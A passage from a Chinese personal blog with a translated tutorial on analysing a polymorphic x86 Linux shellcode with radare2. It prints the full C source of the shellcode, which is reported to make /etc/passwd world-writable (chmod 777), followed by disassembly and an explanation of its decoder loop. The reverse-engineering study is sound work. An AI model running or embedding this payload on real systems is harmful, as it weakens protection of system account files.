<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/6/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2014/08/07/radare2-shellcode/" itemprop="url">
                  Radare2小试: 简单shellcode分析(意译)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-07T00:00:00+08:00" content="2014-08-07">
              2014-08-07
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2014/08/07/radare2-shellcode/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2014/08/07/radare2-shellcode/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>意译自： <a href="http://canthack.org/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/" target="_blank" rel="external">Adventures with Radare2 #1: A Simple Shellcode Analysis</a></p>
<p>有个同学最近在学汇编。把我逆向的热情又拉起来了。下午看到个比较有意思又能看懂的文章，胡乱意译，可以当作我个人的一个笔记。有什么想法可以留言讨论。</p>
<p>以下是正文</p>
<hr>
<p><a href="http://radare.org/" target="_blank" rel="external">Radare2</a>——一个开源逆向工程工具箱，包含反汇编器、调试器和十六进制编辑器。本文将它嗯过逆向在<a href="http://www.projectshellcode.com" target="_blank" rel="external">Project Shellcode</a>上找到的shellcode来展示其基础用法。</p>
<h2 id="Shellcode">Shellcode</h2><p>我们先谈谈啥叫<code>Shellcode</code>，别想成shell脚本了。<code>shellcode</code>之用来挖掘漏洞的有效载荷。其中的典型就是注入一段启动shell的代码。</p>
<p>Project Shellcode是一个shellcode及其源码仓库。我通过<a href="http://reddit.com/r/reverseengineering" target="_blank" rel="external">reddit.com/r/reverseengineering</a>在上月找到的。让我们看看其中一个例子。</p>
<h2 id="60字节的chmod_777多态x86_Linux_Shellcode">60字节的chmod 777多态x86 Linux Shellcode</h2><p>我碰巧先看到<a href="http://www.projectshellcode.com/?q=node/289" target="_blank" rel="external">这个</a>.</p>
<pre><code>/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' <span class="command">\ </span>           __  /'__`<span class="command">\ </span>       /<span class="command">\ </span><span class="command">\_</span>_  /'__`<span class="command">\ </span>                  0
0  /<span class="command">\_</span>, <span class="command">\ </span>   ___   /<span class="command">\_</span><span class="command">\/</span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span>   ___<span class="command">\ </span><span class="command">\ </span>,_<span class="command">\/</span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span> _ ___           1
1  <span class="command">\/</span>_/<span class="command">\ </span><span class="command">\ </span>/' _ `<span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\/</span>_/_<span class="command">\_</span>&lt;_  /'___<span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\`</span>'__<span class="command">\ </span>         0
0     <span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\_</span>_/<span class="command">\ </span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span>           1
1      <span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\_</span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\_</span>___/<span class="command">\ </span><span class="command">\_</span>___<span class="command">\\</span> <span class="command">\_</span>_<span class="command">\\</span> <span class="command">\_</span>___/<span class="command">\ </span><span class="command">\_</span><span class="command">\ </span>          0
0       <span class="command">\/</span>_/<span class="command">\/</span>_/<span class="command">\/</span>_/<span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\/</span>___/  <span class="command">\/</span>____/ <span class="command">\/</span>__/ <span class="command">\/</span>___/  <span class="command">\/</span>_/           1
1                  <span class="command">\ </span><span class="command">\_</span>___/ &gt;&gt; Exploit database separated by exploit   0
0                   <span class="command">\/</span>___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  <span class="special">[</span>+<span class="special">]</span> Site            : Inj3ct0r.com                                  0
1  <span class="special">[</span>+<span class="special">]</span> Support e-mail  : submit<span class="special">[</span>at<span class="special">]</span>inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 60 bytes chmod 777 polymorphic x86 linux shellcode
Date   : Sat Jun  5 16:10:00 2010
Author : gunslinger_ 
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com),
ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
mywisdom (devilzc0de.org), loneferret (offensive-security.com)
*/

/*
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost<span class="special">#</span> gcc -o polymorphic_chmod polymorphic_chmod.c
chmod.c: In function ‘main’:
chmod.c:37: warning: incompatible implicit declaration of built-in function ‘strlen’
root@localhost<span class="special">#</span> ./polymorphic_chmod
Length: 64
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rwxrwxrwx 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost<span class="special">#</span> chmod 644 /etc/passwd
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
*/

<span class="special">#</span>include &lt;stdio.h&gt;
<span class="special">#</span>include &lt;string.h&gt;

char shellcode<span class="special">[</span><span class="special">]</span> =
    "<span class="command">\xeb</span><span class="command">\x</span>11<span class="command">\x</span>5e<span class="command">\x</span>31<span class="command">\xc</span>9<span class="command">\xb</span>1<span class="command">\x</span>27<span class="command">\x</span>80<span class="command">\x</span>6c<span class="command">\x</span>0e<span class="command">\xff</span><span class="command">\x</span>35<span class="command">\x</span>80<span class="command">\xe</span>9<span class="command">\x</span>01"
    "<span class="command">\x</span>75<span class="command">\xf</span>6<span class="command">\xeb</span><span class="command">\x</span>05<span class="command">\xe</span>8<span class="command">\xea</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\x</span>20<span class="command">\x</span>4a<span class="command">\x</span>66<span class="command">\xf</span>5<span class="command">\xe</span>5<span class="command">\x</span>44"
    "<span class="command">\x</span>90<span class="command">\x</span>66<span class="command">\xfe</span><span class="command">\x</span>9b<span class="command">\xee</span><span class="command">\x</span>34<span class="command">\x</span>36<span class="command">\x</span>02<span class="command">\xb</span>5<span class="command">\x</span>66<span class="command">\xf</span>5<span class="command">\xe</span>5<span class="command">\x</span>36<span class="command">\x</span>66<span class="command">\x</span>10"
    "<span class="command">\x</span>02<span class="command">\xb</span>5<span class="command">\x</span>1d<span class="command">\x</span>1b<span class="command">\x</span>34<span class="command">\x</span>34<span class="command">\x</span>34<span class="command">\x</span>64<span class="command">\x</span>9a<span class="command">\xa</span>9<span class="command">\x</span>98<span class="command">\x</span>64<span class="command">\xa</span>5<span class="command">\x</span>96<span class="command">\xa</span>8"
    "<span class="command">\xa</span>8<span class="command">\xac</span><span class="command">\x</span>99";

int main(void)
<span class="special">{</span>
    fprintf(stdout,"Length: <span class="comment">%zu\n",strlen(shellcode));</span>
    (*(void(*)()) shellcode)();

return 0;
<span class="special">}</span>
</code></pre><p>评论中的描述声称代码在<code>/etc/passwd</code>中设置文件权限为<code>777</code>，但是你乍一看肯定看不出来。我们只能看到一个初始化为16进制的字节数组。接着被投射给函数指针然后调用。</p>
<h2 id="实用Radare2分析">实用Radare2分析</h2><p>我们如何弄清程序做了什么？我们可以构建并且运行它，但我不会。因为它可能移除我的家目录。我们实用radare2静态检测它。</p>
<p>首先构建二进制文件</p>
<pre><code>~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse ⮀ cc -o shellcode polymorphic_chmod_etc_passwd_777.c</span>
</code></pre><p>接着载入到radare2中：</p>
<pre><code> ~/Work/project/<span class="property">reverse</span> ⮀ r2 ./shellcode 
 <span class="comment">-- In soviet Afghanistan you debug radare2!</span>
[<span class="number">0x00400520</span>]&gt; 
</code></pre><p>我们没有加<code>-d</code>参数，这样可以以静态分析模式运行，而不是实用radare2内建的调试器。现在radare已经就绪，让我们开始输入命令。</p>
<p>radare2的命令通常都非常短。键入<code>?</code>回车就会进入帮助概述。若问号后面跟着命令，就会给出命令使用的详细信息。</p>
<p>我们首先得定位字节字符串。因为二进制文件没有被精简(stripped)，有幸保留了<code>main</code>函数的虚拟地址。Radare2使用<code>flags</code>的概念标记二进制文件中的有用位置。尝试键入<code>f</code>来得到标记列表。main函数将被标记为<code>sym.main</code>。</p>
<p>我们使用<code>pd</code>命令反汇编：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pd@sym.main 
            <span class="comment">;-- sym.main:</span>
            <span class="number">0x0804849c</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>                                     
            <span class="number">0x0804849d</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
            <span class="number">0x0804849f</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
            <span class="number">0x080484a2</span>    83ec10       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x10</span>
            <span class="number">0x080484a5</span>    c7042440a00. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], sym.shellcode <span class="comment">;  0x0804a040 </span>
            <span class="number">0x080484ac</span>    e8bffeffff   <span class="keyword">call</span> sym.imp.strlen
               <span class="number">0x08048370</span>(unk) <span class="comment">; sym.imp.strlen</span>
            <span class="number">0x080484b1</span>    8b1580a00408 <span class="keyword">mov</span> <span class="literal">edx</span>, [sym.__TMC_END__]
            <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
</code></pre><p><code>pd</code>命令将反汇编等于<code>block size</code>的代码块(参见<code>b</code>命令)，本例中块大小似乎比main函数大很多。我们知道gcc生成结构非常好的函数，我们让radare2来分析这个函数并完整打印：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; af@sym.main 
[<span class="number">0x080483a0</span>]&gt; pdf@sym.main
           <span class="comment">; DATA XREF from 0x080483b7 (fcn.08048396)</span>
/ (fcn) sym.main <span class="number">61</span>
|          <span class="number">0x0804849c</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>
|          <span class="number">0x0804849d</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
|          <span class="number">0x0804849f</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
|          <span class="number">0x080484a2</span>    83ec10       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x10</span>
|          <span class="number">0x080484a5</span>    c7042440a00. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], sym.shellcode <span class="comment">;  0x0804a040 </span>
|          <span class="number">0x080484ac</span>    e8bffeffff   <span class="keyword">call</span> sym.imp.strlen
|             sym.imp.strlen(unk)
|          <span class="number">0x080484b1</span>    8b1580a00408 <span class="keyword">mov</span> <span class="literal">edx</span>, [sym.__TMC_END__]
|          <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
|          <span class="number">0x080484bb</span>    c7442404708. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>+<span class="number">0x4</span>], <span class="keyword">str</span>.Length___zu_n <span class="comment">;  0x08048570 </span>
|          <span class="number">0x080484c3</span>    <span class="number">891424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">edx</span>
|          <span class="number">0x080484c6</span>    e8c5feffff   <span class="keyword">call</span> sym.imp.fprintf
|             sym.imp.fprintf()
|          <span class="number">0x080484cb</span>    b840a00408   <span class="keyword">mov</span> <span class="literal">eax</span>, sym.shellcode <span class="comment">;  0x0804a040 </span>
|          <span class="number">0x080484d0</span>    ffd0         <span class="keyword">call</span> <span class="literal">eax</span>
|             <span class="number">0x00000000</span>() <span class="comment">; section..comment</span>
|          <span class="number">0x080484d2</span>    b800000000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x0</span>
|          <span class="number">0x080484d7</span>    c9           <span class="keyword">leave</span>
\          <span class="number">0x080484d8</span>    c3           <span class="keyword">ret</span>
</code></pre><p>打眼一看就知道需要什么知道什么了。在二进制文件中有足够的信息来帮助标记挖掘漏洞的shellcode字符串位置。你可以在符号名后头看到实际地址。</p>
<p>这个程序对载荷做了什么？可以看到<code>strlen()</code>和<code>fprintf()</code><br>的调用。但更重要的，shellcode的地址在被调用前载入eax寄存器(在<code>0x080484cb</code>载入，于<code>0x080484d0</code>调用)。显然下一步就是检查有效载荷看看它做了什么：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pD <span class="number">60</span>@sym.shellcode
|      ,  <span class="comment">; DATA XREF from 0x080484a2 (sym.main)</span>
|      ,  <span class="comment">; DATA XREF from 0x080484c8 (sym.main)</span>
       ,  <span class="comment">;-- sym.shellcode:</span>
       ,=&lt; <span class="number">0x0804a040</span>    eb11         <span class="keyword">jmp</span> <span class="number">0x804a053</span>
       |   <span class="comment">;-- str._1___:</span>
       |   <span class="number">0x0804a042</span>     <span class="string">.string</span> <span class="string">"^1ɱ'"</span> <span class="comment">; len=6</span>
      ||   <span class="number">0x0804a048</span>    6c           <span class="keyword">insb</span>
      ||   <span class="number">0x0804a049</span>    0e           <span class="keyword">push</span> <span class="literal">cs</span>
      ||   <span class="number">0x0804a04a</span>    ff3580e90175 <span class="keyword">push</span> <span class="preprocessor">dword</span> [<span class="number">0x7501e980</span>]
       |   <span class="number">0x0804a050</span>    f6eb         <span class="keyword">imul</span> <span class="literal">bl</span>
     | |   <span class="number">0x0804a052</span>    05e8eaffff   <span class="keyword">add</span> <span class="literal">eax</span>, <span class="number">0xffffeae8</span>
     |     <span class="number">0x0804a057</span>    ff20         <span class="keyword">jmp</span> <span class="preprocessor">dword</span> [<span class="literal">eax</span>]
           <span class="number">0x0804a059</span>    4a           <span class="keyword">dec</span> <span class="literal">edx</span>
           <span class="number">0x0804a05a</span>    66f5         o16 <span class="keyword">cmc</span>
           <span class="number">0x0804a05c</span>    e544         <span class="keyword">in</span> <span class="literal">eax</span>, <span class="number">0x44</span>
           <span class="number">0x0804a05e</span>    <span class="number">90</span>           <span class="keyword">nop</span>
           <span class="number">0x0804a05f</span>    66fe9b       invalid
           <span class="number">0x0804a062</span>    ee           <span class="keyword">out</span> <span class="literal">dx</span>, <span class="literal">al</span>
           <span class="number">0x0804a063</span>    <span class="number">3436</span>         <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x36</span>
           <span class="number">0x0804a065</span>    02b566f5e536 <span class="keyword">add</span> <span class="number">dh</span>, [<span class="literal">ebp</span>+<span class="number">0x36e5f566</span>]
           <span class="number">0x0804a06b</span>    <span class="number">661002</span>       o16 <span class="keyword">adc</span> [<span class="literal">edx</span>], <span class="literal">al</span>
           <span class="number">0x0804a06e</span>    b51d         <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0x1d</span> <span class="comment">;  0x0000001d </span>
           <span class="comment">;-- str._e444d:</span>
           <span class="number">0x0804a070</span>     <span class="string">.string</span> <span class="string">"\\e444d"</span> <span class="comment">; len=6</span>
           <span class="number">0x0804a076</span>    a99864a596   <span class="keyword">test</span> <span class="literal">eax</span>, <span class="number">0x96a56498</span>
           <span class="number">0x0804a07b</span>    a8           invalid
</code></pre><p>这里使用<code>pD</code>来指定想要反汇编的字节数(这里是60)。该怎么评论这些呢？乍一看，有些不能执行的东西，有点棘手。</p>
<p>译者：我的radare git-2014-7-26版本显然和2011年作者写这篇文章时变化了很多。为了能够继续下去，使用<code>pDi</code>命令：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pDi <span class="number">60</span>@sym.shellcode
<span class="number">0x0804a040</span>              eb11  <span class="keyword">jmp</span> <span class="number">0x804a053</span>
<span class="number">0x0804a042</span>                5e  <span class="keyword">pop</span> <span class="literal">esi</span>
<span class="number">0x0804a043</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a045</span>              b127  <span class="keyword">mov</span> <span class="literal">cl</span>, <span class="number">0x27</span>
<span class="number">0x0804a047</span>        806c0eff35  <span class="keyword">sub</span> <span class="preprocessor">byte</span> [<span class="literal">esi</span>+<span class="literal">ecx</span>-<span class="number">0x1</span>], <span class="number">0x35</span>
<span class="number">0x0804a04c</span>            80e901  <span class="keyword">sub</span> <span class="literal">cl</span>, <span class="number">0x1</span>
<span class="number">0x0804a04f</span>              75f6  <span class="keyword">jne</span> <span class="number">0x804a047</span>
<span class="number">0x0804a051</span>              eb05  <span class="keyword">jmp</span> <span class="number">0x804a058</span>
<span class="number">0x0804a053</span>        e8eaffffff  <span class="keyword">call</span> <span class="number">0x804a042</span>
<span class="number">0x0804a058</span>            204a66  <span class="keyword">and</span> [<span class="literal">edx</span>+<span class="number">0x66</span>], <span class="literal">cl</span>
<span class="number">0x0804a05b</span>                f5  <span class="keyword">cmc</span>
<span class="number">0x0804a05c</span>              e544  <span class="keyword">in</span> <span class="literal">eax</span>, <span class="number">0x44</span>
<span class="number">0x0804a05e</span>                <span class="number">90</span>  <span class="keyword">nop</span>
<span class="number">0x0804a05f</span>                <span class="number">66</span>  invalid
<span class="number">0x0804a062</span>                ee  <span class="keyword">out</span> <span class="literal">dx</span>, <span class="literal">al</span>
<span class="number">0x0804a063</span>              <span class="number">3436</span>  <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x36</span>
<span class="number">0x0804a065</span>      02b566f5e536  <span class="keyword">add</span> <span class="number">dh</span>, [<span class="literal">ebp</span>+<span class="number">0x36e5f566</span>]
<span class="number">0x0804a06b</span>            <span class="number">661002</span>  o16 <span class="keyword">adc</span> [<span class="literal">edx</span>], <span class="literal">al</span>
<span class="number">0x0804a06e</span>              b51d  <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0x1d</span>
<span class="number">0x0804a070</span>            1b3434  <span class="keyword">sbb</span> <span class="literal">esi</span>, [<span class="literal">esp</span>+<span class="literal">esi</span>]
<span class="number">0x0804a073</span>              <span class="number">3464</span>  <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x64</span>
<span class="number">0x0804a075</span>    9aa99864a596a8  <span class="keyword">call</span> <span class="preprocessor">dword</span> <span class="number">0xa896</span>:<span class="number">0xa56498a9</span>
<span class="number">0x0804a07c</span>              a8ac  <span class="keyword">test</span> <span class="literal">al</span>, <span class="number">0xac</span>
<span class="number">0x0804a07e</span>                <span class="number">99</span>  <span class="keyword">cdq</span>
<span class="number">0x0804a07f</span>            <span class="number">004743</span>  <span class="keyword">add</span> [<span class="literal">edi</span>+<span class="number">0x43</span>], <span class="literal">al</span>
<span class="number">0x0804a082</span>                <span class="number">43</span>  <span class="keyword">inc</span> <span class="literal">ebx</span>
<span class="number">0x0804a083</span>              3a20  <span class="keyword">cmp</span> <span class="number">ah</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a085</span>            <span class="number">284765</span>  <span class="keyword">sub</span> [<span class="literal">edi</span>+<span class="number">0x65</span>], <span class="literal">al</span>
<span class="number">0x0804a088</span>                6e  <span class="keyword">outsb</span>
<span class="number">0x0804a089</span>              746f  <span class="keyword">je</span> <span class="number">0x804a0fa</span>
<span class="number">0x0804a08b</span>                6f  <span class="keyword">outsd</span>
<span class="number">0x0804a08c</span>            20342e  <span class="keyword">and</span> [<span class="literal">esi</span>+<span class="literal">ebp</span>], <span class="number">dh</span>
<span class="number">0x0804a08f</span>                <span class="number">37</span>  <span class="keyword">aaa</span>
<span class="number">0x0804a090</span>    2e332d72312070  <span class="keyword">xor</span> <span class="literal">ebp</span>, [<span class="literal">cs</span>:<span class="number">0x70203172</span>]
<span class="number">0x0804a097</span>              312e  <span class="keyword">xor</span> [<span class="literal">esi</span>], <span class="literal">ebp</span>
<span class="number">0x0804a099</span>            332c20  <span class="keyword">xor</span> <span class="literal">ebp</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a09c</span>              <span class="number">7069</span>  <span class="keyword">jo</span> <span class="number">0x804a107</span>
<span class="number">0x0804a09e</span>      652d302e352e  <span class="keyword">sub</span> <span class="literal">eax</span>, <span class="number">0x2e352e30</span>
<span class="number">0x0804a0a4</span>        352920342e  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="number">0x2e342029</span>
<span class="number">0x0804a0a9</span>                <span class="number">37</span>  <span class="keyword">aaa</span>
<span class="number">0x0804a0aa</span>            2e3300  <span class="keyword">xor</span> <span class="literal">eax</span>, [<span class="literal">cs</span>:<span class="literal">eax</span>]
<span class="number">0x0804a0ad</span>              1c00  <span class="keyword">sbb</span> <span class="literal">al</span>, <span class="number">0x0</span>
<span class="number">0x0804a0af</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b1</span>              <span class="number">0200</span>  <span class="keyword">add</span> <span class="literal">al</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0b3</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b5</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b7</span>              <span class="number">0400</span>  <span class="keyword">add</span> <span class="literal">al</span>, <span class="number">0x0</span>
<span class="number">0x0804a0b9</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0bb</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0bd</span>                9c  <span class="keyword">pushfd</span>
<span class="number">0x0804a0be</span>            <span class="number">840408</span>  <span class="keyword">test</span> [<span class="literal">eax</span>+<span class="literal">ecx</span>], <span class="literal">al</span>
<span class="number">0x0804a0c1</span>              3a00  <span class="keyword">cmp</span> <span class="literal">al</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0c3</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c5</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c7</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c9</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0cb</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0cd</span>                1e  <span class="keyword">push</span> <span class="literal">ds</span>
<span class="number">0x0804a0ce</span>              <span class="number">0300</span>  <span class="keyword">add</span> <span class="literal">eax</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0d0</span>              <span class="number">0002</span>  <span class="keyword">add</span> [<span class="literal">edx</span>], <span class="literal">al</span>
</code></pre><p>现在开始在心中模拟执行。首先跳到<code>0x804a053</code>，在那里调用<code>0x804a042</code>，就是第一个指令后面的一个指令。</p>
<p>看上去啥也没干似的。但是，<code>call</code>调用将调用的返回地址推入栈中，接着存入<code>esi</code>中。在32位x86中没法直接获取<code>eip</code>，刚才那个过程就是著名的获取eip的一种hack。程序计数器(<code>eip</code>)可以用来指向有效载荷相关的数据/代码(记住：攻击者不知道他的代码将被连接器分配到何处)。</p>
<p>现在执行到<code>0x0804a043</code>，<code>esi</code>中的值是<code>0x0804a058</code>。这个异或指令在把<code>0x27</code>载入<code>ecx</code>前将其置零。</p>
<p><code>0x0804a047</code>开始将<code>[esi+ecx-0x1]</code>地址的内容减<code>0x35</code><br><code>0x3c00104c</code>将<code>ecx</code>减1<br><code>0x3c00104f</code>如果<code>ecx</code>不为零循环到<code>0x0804a047</code></p>
